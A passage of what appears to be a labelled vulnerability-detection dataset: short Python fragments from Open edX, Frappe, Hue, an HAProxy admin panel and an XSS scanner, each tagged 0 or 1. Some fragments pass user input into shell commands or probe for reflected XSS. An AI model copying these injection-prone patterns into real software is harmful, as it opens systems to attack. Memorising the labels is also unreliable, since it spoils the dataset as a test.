xss_check(url,method,headers,body,scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT':", "label": 0}, {"snippet_id": 53647, "code": "'wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping", "label": 0}, {"snippet_id": 22824, "code": "', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r", "label": 1}, {"snippet_id": 1343, "code": ".literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data[", "label": 0}, {"snippet_id": 37222, "code": " global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\"", "label": 1}, {"snippet_id": 23290, "code": "/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P", "label": 0}, {"snippet_id": 27686, "code": " local_config.GAEConfig().get('ga_tracking_id') if not auth.is_current_user_admin() else None) if values['is_logged_in']: values['switch_account_url']=make_login_url(self.request.url) values['logout_url", "label": 0}, {"snippet_id": 29938, "code": ".path.dirname(os.getcwd())+'/keys/'+name+'.pem' \t \ttry: \t\twith open(ssh_keys, \"w\") as conf: \t\t\tconf.write(form.getvalue('ssh_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save", "label": 0}, {"snippet_id": 36598, "code": " import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t", "label": 1}, {"snippet_id": 14182, "code": ".news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>", "label": 0}, {"snippet_id": 41234, "code": "}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local", "label": 1}, {"snippet_id": 48899, "code": ": def __init__(self, smart_list_item, column, object): self.smart_list_item=smart_list_item self.column=column self.object=object def get_value(self): if self.column.render_function: return self.column", "label": 1}, {"snippet_id": 26033, "code": "): self.event=event=kwargs.pop('event') self.request=kwargs.pop('request', None) self.validate_vat_id=kwargs.pop('validate_vat_id') self.all_optional=kwargs.pop('all_optional', False) super().__init__(", "label": 0}, {"snippet_id": 23468, "code": ", name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views", "label": 0}, {"snippet_id": 31665, "code": ".legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \t\t \tplots=[] \tfor key, value in p.items(): \t\tplots.append(value) \t\t \tgrid=gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location", "label": 0}, {"snippet_id": 45093, "code": " PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) def list_editor_coordinators(request): coordinators", "label": 0}, {"snippet_id": 54208, "code": " sky blue').grid(row=4) Label(main, text=\"Payload:\",background='light sky blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light sky blue').grid(row=6) Label(main, text=\"Refresh:\",background", "label": 0}, {"snippet_id": 43118, "code": "('=',1)})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date", "label": 0}, {"snippet_id": 14701, "code": "', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('", "label": 0}, {"snippet_id": 25446, "code": " kwargs['widget']=(kwargs.get('widget') or self.widget)( scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs',{}) ) defaults.update(**kwargs) for fname, label, size in self.scheme['fields']: defaults", "label": 0}, {"snippet_id": 47623, "code": "(NumberField(name='allowed_reservations', button_text=str(1), minimum=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4)) f.add_content", "label": 0}, {"snippet_id": 9381, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 6166, "code": "(_CONFIG_DEFAULTS) if not self.config.read([filename]): raise ValueError(\"Failed loading config file{!r}\".format(filename)) @property def num_threads(self): \"\"\" Number of worker threads to start(integer).", "label": 0}, {"snippet_id": 9696, "code": "): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),", "label": 0}, {"snippet_id": 7084, "code": "'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views", "label": 0}, {"snippet_id": 41213, "code": ".sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict", "label": 0}, {"snippet_id": 35146, "code": " \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError(self.doctype, self.name, e) \tdef update_modified(self): \t\t'''Update modified timestamp''' ", "label": 0}, {"snippet_id": 40313, "code": " \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor df.get(\"fieldtype\") in(\"Attach\", \"Attach Image\") \t\t\t\t\t\t \t\t\t\t\t\tor self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get", "label": 1}, {"snippet_id": 30191, "code": ".getvalue('serv') \taction=form.getvalue('action_waf') \tcommands=[ \"sudo systemctl %s waf\" % action] \tfunct.ssh_command(serv, commands)\t\t \t if act==\"overview\": \tovw.get_overview() \t if act==\"overviewwaf\":", "label": 0}, {"snippet_id": 50256, "code": " an init mode operation(at startup) Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] remote_addr=request.getClientIP() host_string=\"%s(%s:%s)\" %(_SERVERNAME, request", "label": 1}, {"snippet_id": 28194, "code": "\terror=funct.get_config(serv, cfg) \t \ttry: \t\tconf=open(cfg, \"r\") \t\tconfig_read=conf.read() \t\tconf.close \texcept IOError: \t\terror +='<br />Can\\'t read import config file' \tos.system(\"/bin/mv %s %s.old\" ", "label": 0}, {"snippet_id": 55176, "code": " ).update_latest_translation() update_translation_memory( action_status['changed_translation_pks'], project, locale ) return JsonResponse({ 'count': action_status['count'], 'invalid_translation_count':", "label": 0}, {"snippet_id": 54343, "code": ".Combobox(main, values=[\"On\", \"Off\"]) target.grid(row=0, column=1) target.config(width=30) cookie.grid(row=1, column=1) cookie.config(width=30) method.grid(row=2, column=1) method.current(0) method.config", "label": 0}, {"snippet_id": 39154, "code": "\t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse:", "label": 0}, {"snippet_id": 26044, "code": " self.all_optional=kwargs.pop('all_optional', False) super().__init__(*args, **kwargs) if not event.settings.invoice_address_vatid: del self.fields['vat_id'] if not event.settings.invoice_address_required", "label": 0}, {"snippet_id": 35868, "code": "(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t", "label": 0}, {"snippet_id": 27932, "code": " GcsUploadHandler(Handler): \"\"\"A handler which uploads files to GCS.\"\"\" def __init__(self, request, response): self.initialize(request, response) self.upload=None def get_upload(self): \"\"\"Get uploads.\"", "label": 0}, {"snippet_id": 49950, "code": " by the ajax chat using POST requests(long-polling when necessary) The WebClient resource in this module will handle these requests and act as a gateway to sessions connected over the webclient. \"\"\" import", "label": 0}, {"snippet_id": 45558, "code": " bundle=Bundle() coordinators=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='coordinator2')] return render('editor", "label": 0}, {"snippet_id": 41405, "code": ": \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro,", "label": 0}, {"snippet_id": 41454, "code": " Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start", "label": 0}, {"snippet_id": 49784, "code": "+\"var socket=io.connect('http://{}:{}');\".format(HOST,PORT) html=html+''' try{setTimeout(` socket.emit('sendMSG','Connection Established.') `,1000) } catch{} socket.on('getMSG',function(data){ document", "label": 1}, {"snippet_id": 52560, "code": " response['properties']=_properties response['name']='%s-%s' %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters", "label": 0}, {"snippet_id": 17691, "code": "'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r", "label": 0}, {"snippet_id": 12221, "code": "<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index')", "label": 1}, {"snippet_id": 29423, "code": "\tfirewalld_commands=[] \t \tfor line in conf: \t\tif \"bind\" in line: \t\t\tbind=line.split(\":\") \t\t\tbind[1]=bind[1].strip(' ') \t\t\tbind=bind[1].split(\"ssl\") \t\t\tbind=bind[0].strip(' \\t\\n\\r') \t\t\tfirewalld_commands.append('sudo", "label": 0}, {"snippet_id": 43440, "code": " df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'", "label": 0}, {"snippet_id": 30851, "code": "'haproxy_save_configs_dir') \tcmd='diff -ub %s%s %s%s' %(hap_configs_dir, left, hap_configs_dir, right)\t \tenv=Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols',", "label": 0}, {"snippet_id": 29743, "code": "\t def get_files(dir=get_config_var('configs', 'haproxy_save_configs_dir'), format='cfg', **kwargs): \timport glob \tfile=set() \treturn_files=set() \t \tfor files in glob.glob(os.path.join(dir,'*.'+format))", "label": 0}, {"snippet_id": 38310, "code": ".published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t", "label": 0}, {"snippet_id": 49665, "code": " return[SmartColumn(self.model, '__str__', 1, self.ordering_query_value, self.ordering_query_param)] columns=[] for index, field in enumerate(self.list_display, start=1): kwargs={ 'model': self.model, ", "label": 0}, {"snippet_id": 22684, "code": "', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name", "label": 0}, {"snippet_id": 42473, "code": " \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args", "label": 0}, {"snippet_id": 1001, "code": ",headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result", "label": 0}, {"snippet_id": 28130, "code": " stderr=\"\" error=\"\" aftersave=\"\" try: \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \tuser=sql.get_user_name_by_uuid(user_id.value) \tservers=sql.get_dick_permit", "label": 0}, {"snippet_id": 24913, "code": "(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" \").join(cmd) return cmd class Pa11yCrawler(BokChoyTestSuite): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against", "label": 0}, {"snippet_id": 22553, "code": " +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views", "label": 0}, {"snippet_id": 44154, "code": "(hits)==1 inner_hits=hits[0]['inner_hits'] domain_hits=inner_hits['domains']['hits']['hits'] assert len(domain_hits)==0 section_hits=inner_hits['sections']['hits']['hits'] assert len(section_hits)==1 section_content_highlight", "label": 0}, {"snippet_id": 30710, "code": " |sudo socat stdio %s | cut -d \",\" -f 1-2,5-10,18,34-36 | column -s, -t' %(enable, backend, haproxy_sock) \t \tif form.getvalue('save')==\"on\": \t\tsave_command='echo \"show servers state\" | sudo socat stdio ", "label": 0}, {"snippet_id": 38578, "code": " \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", ", "label": 0}, {"snippet_id": 38325, "code": "(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment' \t\t\t\t\t\tand comment_type='Comment' \t\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom", "label": 0}, {"snippet_id": 22004, "code": ")$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 48438, "code": "]) ar.save() if \"srid\" in request.GET: response=HttpResponseRedirect(forward_url +\"?rid=\" +str(current_reservation.id) +\"&srid=\" +request.GET[\"srid\"]) else: response=HttpResponseRedirect(forward_url +\"", "label": 1}, {"snippet_id": 44982, "code": ".fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form:", "label": 0}, {"snippet_id": 10103, "code": ".env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_suite_spec(self): spec='test_foo", "label": 0}, {"snippet_id": 25777, "code": " field=forms.ModelChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget=forms.Select, empty_label='', initial=initial.options.first() if initial else None, ", "label": 0}, {"snippet_id": 19058, "code": "(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor", "label": 0}, {"snippet_id": 20844, "code": "': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$", "label": 0}, {"snippet_id": 50890, "code": "(any): Remaining args will be arguments for `cmd`. Kwargs: options(dict): These are ignored for oob commands. Use command arguments(which can hold dicts) to send instructions to the client instead. \"\"\"", "label": 0}, {"snippet_id": 30092, "code": ".system(\"mv %s %s\" %(name, cert_local_dir)) \tfunct.logging(serv, \"add.py \t if form.getvalue('backend') is not None: \tfunct.show_backends(serv) \t if form.getvalue('ip') is not None and serv is not None:", "label": 0}, {"snippet_id": 26405, "code": " Please contact support to ' 'resolve this manually.')) else: self.instance.vat_id_validated=False class BaseInvoiceNameForm(BaseInvoiceAddressForm): def __init__(self, *args, **kwargs): super().__init__(", "label": 0}, {"snippet_id": 23836, "code": " test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec", "label": 0}, {"snippet_id": 28788, "code": "): \t\tssh_enable=sshs[3] \t\tssh_user_name=sshs[4] \t\tssh_user_password=sshs[5] \t\tssh_key_name=fullpath+'/keys/%s.pem' % sshs[2] \tservers=sql.select_servers(server=serv) \tfor server in servers: \t\tssh_port=server", "label": 0}, {"snippet_id": 44505, "code": "']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied.') if len(jobs) > 1 else _('Workflow copied.')) return", "label": 0}, {"snippet_id": 48619, "code": "])) +\"&srid=\" +str(sr.id)) if \"rid\" in request.GET: r=GroupReservation.objects.get(id=int(request.GET[\"rid\"])) elif u.number_of_allowed_reservations > GroupReservation.objects.all().filter(createdByUser", "label": 0}, {"snippet_id": 51162, "code": " ordering=[\"-name\"] class IECrontabSchedule(ImportExportModelAdmin): pass admin.site.unregister(PeriodicTask) admin.site.unregister(CrontabSchedule) admin.site.register(PeriodicTask, IEPeriodicTaskAdmin)", "label": 0}, {"snippet_id": 20545, "code": "{report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' ", "label": 0}, {"snippet_id": 32428, "code": " way how Gitiles converts header titles to URL anchors. Gitiles' official documentation about the conversion is at: https://gerrit.googlesource.com/gitiles/+/master/Documentation/markdown.md Args: value", "label": 0}, {"snippet_id": 25071, "code": "=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, )", "label": 0}, {"snippet_id": 28551, "code": "/config_edit-\"+get_data('logs')+\".log\", \"a\") \ttry:\t \t\tlog.write(mess) \t\tlog.close \texcept IOError as e: \t\tprint('<center><div class=\"alert alert-danger\">Can\\'t write log. Please check log_path in config %e</div", "label": 0}, {"snippet_id": 22169, "code": "\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request", "label": 0}, {"snippet_id": 23867, "code": ") ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly", "label": 0}, {"snippet_id": 113, "code": " payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0", "label": 1}, {"snippet_id": 21969, "code": "'ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', ", "label": 0}, {"snippet_id": 16801, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^", "label": 1}, {"snippet_id": 47125, "code": " column_default_sort=('updated', True) page_size=25 def delete_model(self, model): \"\"\"Delete a record.\"\"\" try: if model.json is None: return True record=Record(model.json, model=model) record.delete() db.session.commit(", "label": 0}, {"snippet_id": 36428, "code": " \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self, fieldname): \t\tdf=self.meta.get_field(fieldname) \t\tval=self.get(fieldname", "label": 0}, {"snippet_id": 41296, "code": "\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) ", "label": 0}, {"snippet_id": 46568, "code": " PopupException(_('POST request required.')) collections=json.loads(request.POST.get('collections')) searcher=DashboardController(request.user) response={ 'result': searcher.delete_collections([collection['id'] for", "label": 0}, {"snippet_id": 7532, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 13530, "code": "<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license", "label": 0}, {"snippet_id": 54817, "code": " get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['is_mobile']=is_mobile(self.request.META['HTTP_USER_AGENT']) return context def test_func(self): return self.request.user==self", "label": 0}, {"snippet_id": 36926, "code": ".parents=[{\"name\": _(\"Home\"), \"route\": \"/\"}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe", "label": 0}, {"snippet_id": 32225, "code": "(THIS_DIR)) sys.path.insert(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown')) import markdown def main(argv): parser=argparse.ArgumentParser(prog='md_browser') parser.add_argument('-p', '--port',", "label": 0}, {"snippet_id": 53578, "code": "': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle", "label": 0}, {"snippet_id": 23853, "code": " test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 21876, "code": "'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 17626, "code": "), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request", "label": 0}, {"snippet_id": 21853, "code": ", 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'):", "label": 0}, {"snippet_id": 39109, "code": ".timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", ", "label": 0}, {"snippet_id": 28023, "code": " login handler.\"\"\" @handler.post(handler.JSON, handler.JSON) def post(self): \"\"\"Handle a post request.\"\"\" id_token=self.request.get('idToken') expires_in=datetime.timedelta(days=SESSION_EXPIRY_DAYS) try", "label": 0}, {"snippet_id": 34388, "code": "\t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for", "label": 0}, {"snippet_id": 33961, "code": ".published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication`", "label": 0}, {"snippet_id": 47498, "code": " m=CheckEnum.NOT_CHECKED f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=m)) if profile: f.add_content(PlainText(\"Email address: \")) f.add_content(TextField(name='email', button_text=str", "label": 0}, {"snippet_id": 51614, "code": "}, 'test':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'production':{ 'ENGINE': DATABASE_ENGINES.get(DB_ENGINE, 'django.db.backends.' +DB_ENGINE), 'NAME", "label": 0}, {"snippet_id": 47520, "code": ".authuser.email))) f.add_content(PlainText(\"Display name: \")) f.add_content(TextField(name='display_name', button_text=profile.displayName)) f.add_content(PlainText('DECT: ')) f.add_content(NumberField", "label": 0}, {"snippet_id": 38829, "code": " self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append(value) \t\t\t \t\t\tvalue.parent_doc=self \t\t\treturn value \t\telse: \t\t\t \t\t\t \t\t\tif(getattr(self", "label": 0}, {"snippet_id": 9797, "code": ", name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views", "label": 0}, {"snippet_id": 28586, "code": " telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip')) \tproxy=sql.get_setting('proxy') \t \tfor telegram in telegrams: \t\ttoken_bot=telegram[1] \t\tchannel_name=telegram", "label": 0}, {"snippet_id": 25683, "code": "{'required': 'required'}) else: widget=forms.CheckboxInput() if initial: initialbool=(initial.answer==\"True\") else: initialbool=False field=forms.BooleanField( label=q.question, required=q.required, help_text", "label": 1}, {"snippet_id": 46295, "code": " template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'autoLoad': True, 'collections': collections, 'layout':[ {\"size\":12,\"rows\":", "label": 0}, {"snippet_id": 35993, "code": "\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value) \tdef _save_passwords(self): \t\t'''Save password field values in __Auth table''' \t\tif self", "label": 0}, {"snippet_id": 17073, "code": ".add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 3729, "code": "-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode(payload): decoded_payload=urllib.unquote(payload).decode('utf8').encode('ascii',", "label": 0}, {"snippet_id": 25331, "code": " except(IndexError, TypeError): widget_value=None if id_: final_attrs=dict( final_attrs, id='%s_%s' %(id_, i), title=self.scheme['fields'][i][1], placeholder=self.scheme['fields'][i][1], ) final_attrs['data", "label": 0}, {"snippet_id": 46271, "code": ").datasets() if not collections and engine=='solr': return no_collections(request) collection=Collection2(user=request.user, name=name, engine=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} template", "label": 0}, {"snippet_id": 26130, "code": ".attrs['data-display-dependency'] self.fields['name_parts']=NamePartsFormField( max_length=255, required=event.settings.invoice_name_required and not self.all_optional, scheme=event.settings.name_scheme", "label": 0}, {"snippet_id": 20395, "code": ".imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir,", "label": 0}, {"snippet_id": 30524, "code": " not None: \trows=form.getvalue('rows1') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':", "label": 0}, {"snippet_id": 31474, "code": "\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \tplots=[] \tfor key, value in p.items(): \t\tplots.append(value) \t\t \tgrid=gridplot(plots, ncols=2, plot_width=800, plot_height=250", "label": 0}, {"snippet_id": 25028, "code": "\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, 